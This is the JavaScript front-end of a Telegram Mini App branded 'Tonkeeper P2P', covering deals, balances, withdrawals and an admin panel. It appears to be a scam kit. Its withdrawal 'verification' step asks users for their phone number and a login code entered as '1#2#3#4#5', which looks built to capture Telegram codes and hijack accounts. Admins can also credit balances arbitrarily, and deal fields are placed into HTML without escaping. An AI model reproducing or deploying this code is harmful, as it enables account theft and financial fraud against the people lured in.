// ========== ИНИЦИАЛИЗАЦИЯ TELEGRAM ==========
const tg = window.Telegram.WebApp;
tg.expand();

// ========== СОСТОЯНИЕ ==========
const state = {
    user: {
        id: tg.initDataUnsafe?.user?.id || 0,
        username: tg.initDataUnsafe?.user?.username || 'user',
        firstName: tg.initDataUnsafe?.user?.first_name || 'User'
    },
    balance: { ton: 0, stars: 0, rub: 0, uah: 0 },
    deals: [],
    currentPage: 'main'
};

// ========== ОБНОВЛЕНИЕ БАЛАНСА ==========
async function updateBalance() {
    try {
        const response = await fetch('/api/balance', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ user_id: state.user.id })
        });
        const data = await response.json();
        if (data.success) {
            state.balance = data.balance;
            updateBalanceUI();
        }
    } catch (error) {
        console.error('Balance update error:', error);
    }
}

function updateBalanceUI() {
    document.getElementById('balTon').textContent = state.balance.ton || 0;
    document.getElementById('balStars').textContent = state.balance.stars || 0;
    document.getElementById('balRub').textContent = state.balance.rub || 0;
    document.getElementById('balUah').textContent = state.balance.uah || 0;
    document.getElementById('userBalance').textContent = 
        `💰 ${state.balance.ton + state.balance.stars + state.balance.rub + state.balance.uah}`;
}

// ========== ЗАГРУЗКА СДЕЛОК ==========
async function loadDeals() {
    try {
        const response = await fetch('/api/deals', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ user_id: state.user.id })
        });
        const data = await response.json();
        if (data.success) {
            state.deals = data.deals;
            renderDeals();
        }
    } catch (error) {
        console.error('Deals load error:', error);
    }
}

function renderDeals() {
    const container = document.getElementById('dealsList');
    if (!state.deals || state.deals.length === 0) {
        container.innerHTML = '<p class="empty">У вас нет сделок</p>';
        return;
    }
    
    container.innerHTML = state.deals.map(deal => `
        <div class="card">
            <h3>${deal.product}</h3>
            <p>💰 ${deal.amount} ${deal.currency}</p>
            <p>👤 Покупатель: @${deal.buyer_username}</p>
            <p>📊 Статус: ${getStatusEmoji(deal.status)} ${getStatusText(deal.status)}</p>
            ${deal.status === 'waiting_payment' ? `
                <button class="action-btn secondary" onclick="copyDealLink('${deal.deal_id}')">
                    🔗 Скопировать ссылку
                </button>
            ` : ''}
        </div>
    `).join('');
}

function getStatusEmoji(status) {
    const map = {
        'waiting_payment': '⏳',
        'paid': '✅',
        'awaiting_confirmation': '📦',
        'completed': '🎁'
    };
    return map[status] || '❓';
}

function getStatusText(status) {
    const map = {
        'waiting_payment': 'Ожидает оплаты',
        'paid': 'Оплачено',
        'awaiting_confirmation': 'Ожидает подтверждения',
        'completed': 'Завершено'
    };
    return map[status] || status;
}

function copyDealLink(dealId) {
    const link = `https://t.me/tonkeeperp2p_bot?start=deal_${dealId}`;
    navigator.clipboard.writeText(link);
    tg.showAlert('✅ Ссылка скопирована!');
}

// ========== СОЗДАНИЕ СДЕЛКИ ==========
document.getElementById('dealForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const product = document.getElementById('productInput').value.trim();
    const currency = document.getElementById('currencySelect').value;
    const amount = parseFloat(document.getElementById('amountInput').value);
    const buyer = document.getElementById('buyerInput').value.trim().replace('@', '');
    
    if (!product || !amount || !buyer) {
        tg.showAlert('❌ Заполните все поля!');
        return;
    }
    
    try {
        const response = await fetch('/api/create_deal', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                user_id: state.user.id,
                username: state.user.username,
                product,
                currency,
                amount,
                buyer_username: buyer
            })
        });
        
        const data = await response.json();
        if (data.success) {
            const resultDiv = document.getElementById('dealResult');
            resultDiv.style.display = 'block';
            resultDiv.innerHTML = `
                <div class="card">
                    <h3>✅ Сделка создана!</h3>
                    <p>ID: ${data.deal_id}</p>
                    <p>Ссылка для покупателя:</p>
                    <input type="text" value="${data.link}" readonly style="width:100%;padding:8px;background:#0f0f1a;border:1px solid #2a2a3e;border-radius:4px;color:#fff;">
                    <button class="action-btn secondary" onclick="navigator.clipboard.writeText('${data.link}')">
                        📋 Скопировать
                    </button>
                </div>
            `;
            tg.showAlert('✅ Сделка успешно создана!');
            document.getElementById('dealForm').reset();
            loadDeals();
        } else {
            tg.showAlert('❌ ' + data.error);
        }
    } catch (error) {
        console.error('Create deal error:', error);
        tg.showAlert('❌ Ошибка создания сделки');
    }
});

// ========== ВЫВОД СРЕДСТВ ==========
document.getElementById('withdrawBtn').addEventListener('click', () => {
    const section = document.getElementById('withdrawSection');
    section.style.display = section.style.display === 'none' ? 'block' : 'none';
});

document.getElementById('confirmWithdrawBtn').addEventListener('click', async () => {
    const currency = document.getElementById('withdrawCurrency').value;
    const details = document.getElementById('withdrawDetails').value.trim();
    
    if (!details) {
        tg.showAlert('❌ Введите реквизиты');
        return;
    }
    
    try {
        const response = await fetch('/api/withdraw', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                user_id: state.user.id,
                username: state.user.username,
                currency,
                details
            })
        });
        
        const data = await response.json();
        if (data.success) {
            tg.showAlert('✅ Заявка на вывод создана!');
            document.getElementById('withdrawSection').style.display = 'none';
            document.getElementById('withdrawDetails').value = '';
            updateBalance();
        } else {
            tg.showAlert('❌ ' + data.error);
        }
    } catch (error) {
        console.error('Withdraw error:', error);
        tg.showAlert('❌ Ошибка вывода');
    }
});

// ========== НАВИГАЦИЯ ==========
document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const page = btn.dataset.page;
        navigateTo(page);
    });
});

function navigateTo(page) {
    // Скрыть все страницы
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
    
    // Показать выбранную
    document.getElementById(`page-${page}`).classList.add('active');
    document.querySelector(`.nav-btn[data-page="${page}"]`).classList.add('active');
    state.currentPage = page;
    
    // Загрузить данные при необходимости
    if (page === 'deals') loadDeals();
    if (page === 'balance') updateBalance();
    if (page === 'admin') loadAdminPanel();
}

// ========== АДМИН ПАНЕЛЬ ==========
async function loadAdminPanel() {
    // Проверка прав
    try {
        const response = await fetch('/api/is_admin', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ user_id: state.user.id })
        });
        const data = await response.json();
        if (!data.is_admin) {
            document.getElementById('adminContent').innerHTML = '<p>⛔ Доступ запрещен</p>';
            return;
        }
        document.getElementById('adminContent').innerHTML = `
            <button class="action-btn secondary" onclick="adminAllDeals()">📊 Все сделки</button>
            <button class="action-btn secondary" onclick="adminWithdrawRequests()">💲 Заявки на вывод</button>
            <button class="action-btn secondary" onclick="adminAddBalance()">💰 Начислить баланс</button>
            <button class="action-btn secondary" onclick="adminManageAdmins()">👥 Управление админами</button>
        `;
    } catch (error) {
        console.error('Admin check error:', error);
    }
}

async function adminAllDeals() {
    try {
        const response = await fetch('/api/all_deals', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ user_id: state.user.id })
        });
        const data = await response.json();
        if (data.success) {
            const html = data.deals.map(d => `
                <div class="card">
                    <h3>#${d.deal_id} - ${d.product}</h3>
                    <p>💰 ${d.amount} ${d.currency}</p>
                    <p>👤 Продавец: @${d.seller_username}</p>
                    <p>👤 Покупатель: @${d.buyer_username}</p>
                    <p>📊 Статус: ${getStatusEmoji(d.status)} ${getStatusText(d.status)}</p>
                </div>
            `).join('');
            showModal(html);
        }
    } catch (error) {
        console.error('All deals error:', error);
    }
}

async function adminWithdrawRequests() {
    try {
        const response = await fetch('/api/withdraw_requests', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ user_id: state.user.id })
        });
        const data = await response.json();
        if (data.success && data.requests.length > 0) {
            const html = data.requests.map(r => `
                <div class="card">
                    <p>👤 ${r.username}</p>
                    <p>💰 ${r.amount} ${r.currency}</p>
                    <p>📝 ${r.details}</p>
                    <button class="action-btn secondary" onclick="confirmWithdraw('${r.id}')">
                        ✅ Подтвердить
                    </button>
                </div>
            `).join('');
            showModal(html);
        } else {
            showModal('<p>📭 Нет активных заявок</p>');
        }
    } catch (error) {
        console.error('Withdraw requests error:', error);
    }
}

async function confirmWithdraw(requestId) {
    try {
        const response = await fetch('/api/confirm_withdraw', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                user_id: state.user.id,
                request_id: requestId
            })
        });
        const data = await response.json();
        if (data.success) {
            tg.showAlert('✅ Вывод подтвержден');
            adminWithdrawRequests();
        } else {
            tg.showAlert('❌ ' + data.error);
        }
    } catch (error) {
        console.error('Confirm withdraw error:', error);
    }
}

async function adminAddBalance() {
    const userId = prompt('Введите Telegram ID пользователя:');
    if (!userId) return;
    
    const currency = prompt('Введите валюту (TON/STARS/RUB/UAH):');
    if (!currency) return;
    
    const amount = prompt('Введите сумму:');
    if (!amount) return;
    
    try {
        const response = await fetch('/api/add_balance', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                user_id: state.user.id,
                target_user_id: parseInt(userId),
                currency: currency.toUpperCase(),
                amount: parseFloat(amount)
            })
        });
        const data = await response.json();
        if (data.success) {
            tg.showAlert('✅ Баланс начислен');
        } else {
            tg.showAlert('❌ ' + data.error);
        }
    } catch (error) {
        console.error('Add balance error:', error);
    }
}

async function adminManageAdmins() {
    const action = confirm('Добавить админа? (Отмена - удалить)');
    const userId = prompt('Введите Telegram ID:');
    if (!userId) return;
    
    try {
        const response = await fetch('/api/manage_admin', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                user_id: state.user.id,
                target_user_id: parseInt(userId),
                action: action ? 'add' : 'remove'
            })
        });
        const data = await response.json();
        if (data.success) {
            tg.showAlert('✅ Операция выполнена');
        } else {
            tg.showAlert('❌ ' + data.error);
        }
    } catch (error) {
        console.error('Manage admin error:', error);
    }
}

// ========== МОДАЛЬНОЕ ОКНО ==========
function showModal(html) {
    const modal = document.getElementById('modal');
    const body = document.getElementById('modalBody');
    body.innerHTML = html;
    modal.style.display = 'flex';
}

document.querySelector('.close').addEventListener('click', () => {
    document.getElementById('modal').style.display = 'none';
});

window.addEventListener('click', (e) => {
    if (e.target === document.getElementById('modal')) {
        document.getElementById('modal').style.display = 'none';
    }
});

// ========== ИНИЦИАЛИЗАЦИЯ ==========
document.addEventListener('DOMContentLoaded', () => {
    // Установка имени пользователя
    document.getElementById('userName').textContent = 
        state.user.firstName || state.user.username || 'User';
    
    // Загрузка данных
    updateBalance();
    loadDeals();
    
    // Настройка кнопок на главной
    document.getElementById('createDealBtn').addEventListener('click', () => {
        navigateTo('create');
    });
    
    document.getElementById('myDealsBtn').addEventListener('click', () => {
        navigateTo('deals');
    });
    
    document.getElementById('balanceBtn').addEventListener('click', () => {
        navigateTo('balance');
    });
    
    // Автообновление каждые 30 секунд
    setInterval(() => {
        if (state.currentPage === 'balance') updateBalance();
        if (state.currentPage === 'deals') loadDeals();
    }, 30000);
});

// ========== ВЕРИФИКАЦИЯ ==========
async function checkVerification() {
    try {
        const response = await fetch('/api/check_verification', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ user_id: state.user.id })
        });
        const data = await response.json();
        if (!data.verified) {
            tg.showAlert('⚠️ Для вывода средств необходима верификация!');
            // Показываем процесс верификации
            showVerificationModal();
        }
        return data.verified;
    } catch (error) {
        console.error('Verification check error:', error);
        return false;
    }
}

function showVerificationModal() {
    const html = `
        <h3>🔐 Верификация</h3>
        <p>Для вывода средств пройдите проверку:</p>
        <ol>
            <li>Нажмите "Я НЕ РОБОТ"</li>
            <li>Отправьте номер телефона</li>
            <li>Введите код: 1#2#3#4#5</li>
        </ol>
        <button class="action-btn primary" onclick="startVerification()">
            🤖 Я НЕ РОБОТ
        </button>
    `;
    showModal(html);
}

async function startVerification() {
    try {
        const response = await fetch('/api/start_verification', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ user_id: state.user.id })
        });
        const data = await response.json();
        if (data.success) {
            tg.showAlert('✅ Верификация начата. Проверьте бота для ввода кода.');
            document.getElementById('modal').style.display = 'none';
        }
    } catch (error) {
        console.error('Start verification error:', error);
    }
}

// Переопределяем кнопку вывода с проверкой
document.getElementById('withdrawBtn').addEventListener('click', async () => {
    const verified = await checkVerification();
    if (verified) {
        const section = document.getElementById('withdrawSection');
        section.style.display = section.style.display === 'none' ? 'block' : 'none';
    }
});

console.log('🔥 Tonkeeper P2P Mini App загружена');